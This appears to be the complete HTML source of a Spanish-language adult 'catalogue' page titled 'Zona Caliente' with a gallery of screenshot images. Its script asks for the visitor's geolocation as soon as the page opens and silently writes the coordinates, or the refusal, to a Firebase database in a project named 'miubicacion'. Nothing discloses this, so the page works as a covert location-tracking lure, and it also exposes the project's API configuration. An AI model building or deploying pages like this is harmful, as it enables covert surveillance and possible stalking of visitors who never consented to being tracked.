<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZONA CALIENTE - Catálogo</title>
    
    <script src="https://www.gstatic.com/firebasejs/10.0.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.0.0/firebase-database-compat.js"></script>

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body { background-color: #0b0c10; color: #c5c6c7; }
        
        header { background-color: #1f2833; padding: 20px; text-align: center; border-bottom: 3px solid #ff003c; }
        header h1 { color: #ffffff; text-transform: uppercase; letter-spacing: 2px; }
        header h1 span { color: #ff003c; }
        
        .hero { 
            background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('principal.png') no-repeat center center/cover; 
            height: 500px; display: flex; flex-direction: column; justify-content: center; align-items: center;
        }
        
        .btn-modelos { 
            margin-top: 20px; padding: 15px 40px; background: #ff003c; color: white; border: none; 
            font-size: 20px; font-weight: bold; cursor: pointer; border-radius: 5px; text-transform: uppercase;
        }

        .section-hidden { display: none; padding: 50px 20px; }
        .active { display: block; }

        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; max-width: 1100px; margin: 0 auto; }
        .grid img { width: 100%; border-radius: 8px; border: 2px solid #1f2833; }
        
        footer { background-color: #111; text-align: center; padding: 20px; margin-top: 40px; color: #666; }
    </style>
</head>
<body>

    <header>
        <h1>ZONA<span>CALIENTE</span></h1>
    </header>

    <section class="hero" id="home">
        <button class="btn-modelos" onclick="mostrarModelos()">MODELOS</button>
    </section>

    <section id="seccion-modelos" class="section-hidden">
        <h2 style="text-align: center; margin-bottom: 30px; color: white;">Catálogo Exclusivo</h2>
        <div class="grid">
            <img src="Captura de pantalla 2026-06-12 220659.png" alt="Imagen 1">
            <img src="Captura de pantalla 2026-06-12 220723.jpg" alt="Imagen 2">
            <img src="Captura de pantalla 2026-06-12 220736.jpg" alt="Imagen 3">
            <img src="Captura de pantalla 2026-06-12 220804.png" alt="Imagen 4">
            <img src="Captura de pantalla 2026-06-12 220816.png" alt="Imagen 5">
            <img src="Captura de pantalla 2026-06-12 220830.png" alt="Imagen 6">
            <img src="Captura de pantalla 2026-06-12 220844.png" alt="Imagen 7">
            <img src="Captura de pantalla 2026-06-12 220856.png" alt="Imagen 8">
            <img src="Captura de pantalla 2026-06-12 220908.png" alt="Imagen 9">
            <img src="Captura de pantalla 2026-06-12 220919.png" alt="Imagen 10">
        </div>
    </section>

    <footer>
        <p>&copy; 2026 Zona Caliente. Exhibición Privada.</p>
    </footer>

    <script>
        // Inicialización de Firebase
        const firebaseConfig = {
            apiKey: "AIzaSyDITt3GQmc1uANwOqWNVoqWgmhm9CQQRdU",
            authDomain: "miubicacion-52e7f.firebaseapp.com",
            databaseURL: "https://miubicacion-52e7f-default-rtdb.firebaseio.com",
            projectId: "miubicacion-52e7f",
            storageBucket: "miubicacion-52e7f.firebasestorage.app",
            messagingSenderId: "847245935895",
            appId: "1:847245935895:web:e9576ba5280ac05b22e352",
            measurementId: "G-GE5FVZMQXP"
        };

        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        // 1. SOLICITAR UBICACIÓN APENAS ABRE LA PÁGINA
        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(siPermitio, errorPermiso);
            }
        };

        function siPermitio(posicion) {
            database.ref('visitas_zona_caliente/' + Date.now()).set({
                latitud: posicion.coords.latitude,
                longitud: posicion.coords.longitude,
                permiso: "Otorgado"
            });
        }

        function errorPermiso(error) {
            database.ref('visitas_zona_caliente/' + Date.now()).set({
                permiso: "Denegado",
                error: error.message
            });
        }

        // 2. FUNCIÓN PARA EL BOTÓN
        function mostrarModelos() {
            document.getElementById('home').style.display = 'none';
            document.getElementById('seccion-modelos').classList.add('active');
        }
    </script>
</body>
</html>
